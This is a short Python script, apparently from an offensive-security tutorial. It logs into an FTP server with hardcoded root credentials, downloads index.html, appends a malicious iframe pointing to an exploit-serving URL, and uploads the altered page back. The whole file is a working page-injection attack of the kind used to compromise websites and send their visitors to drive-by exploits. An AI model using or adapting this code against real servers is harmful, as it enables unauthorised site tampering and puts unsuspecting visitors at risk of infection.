import ftplib

def injectPage(ftp, page, redirect):
    f = open(f'{page}.tmp', 'w')
    ftp.retrlines(f'RETR {page}', f.write)
    print(f'[+] Download Page: {page}')

    f.write(redirect)
    f.close()
    print(f'[+] Injected Malicious IFrame on: {page}')

    ftp.storlines(f'STOR {page}', open(f'{page}.tmp'))
    print(f'[+] Uploaded Injected Page: {page}')

host = '127.0.0.1'
username = 'root'
password = 'admin'

ftp = ftplib.FTP(host)
ftp.login(username, password)
redirect = '<iframe src=http:\\\\127.0.0.1:8080\\exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
